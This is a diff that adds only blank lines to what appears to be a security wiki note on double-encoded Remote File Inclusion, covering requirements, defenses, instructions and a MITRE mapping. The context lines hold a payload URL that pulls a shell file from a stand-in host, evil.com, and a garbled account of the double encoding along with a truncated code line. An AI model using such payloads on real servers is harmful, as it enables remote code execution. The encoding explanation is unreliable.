@@ -36,6 +36,8 @@ From a technical standpoint, the attacker is taking advantage of a vulnerability
 
 From a business perspective, this attack can result in the theft of sensitive information, the disruption of business operations, and damage to the organization's reputation.
 
+ 
+
 ## Requirements
 
 1. Access to the vulnerable web application
@@ -43,6 +45,8 @@ From a business perspective, this attack can result in the theft of sensitive in
 1. Knowledge of the web application's URL parameters
 
 1. Ability to encode URLs twice
+
+ 
 
 ## Defense
 
@@ -52,6 +56,8 @@ From a business perspective, this attack can result in the theft of sensitive in
 
 1. Monitor web server logs for suspicious activity, such as requests for files that do not exist on the server
 
+ 
+
 ## Objectives
 
 1. Exploit a web application that is vulnerable to RFI attacks
@@ -60,19 +66,31 @@ From a business perspective, this attack can result in the theft of sensitive in
 
 1. Gain access to sensitive information on the server
 
+ 
+
 # Instructions
 
 1. To execute this attack, the attacker sends a specially crafted URL to the vulnerable web application. The URL should contain a path to a file on a remote server that the attacker controls. The attacker then encodes the URL twice to bypass certain security measures. Once the web server processes the request, it includes the contents of the remote file in the web page response, giving the attacker the ability to execute arbitrary code on the server.
 
+ 
+
+
+
 **Code**: [[http://example.com/index.php?page=http:%252f%252fe]]
 
+
+
 > The 'page' parameter in the URL is vulnerable to RFI attacks. By including a path to a file on a remote server that the attacker controls, the attacker can execute arbitrary code on the web server. The attacker encodes the URL twice to bypass certain security measures. The first encoding replaces the forward slashes with '%252f', and the second encoding replaces the '%' with '%25'. This allows the URL to bypass certain security measures that look for encoded characters.
+
+
 
 **Command** ([[URL accessed]]):
 
 ```bash
 http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -97,3 +115,5 @@ http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
 - [[Basic RFI]]
 - [[Double encoding]]
 - [[File Inclusion]]
+
+
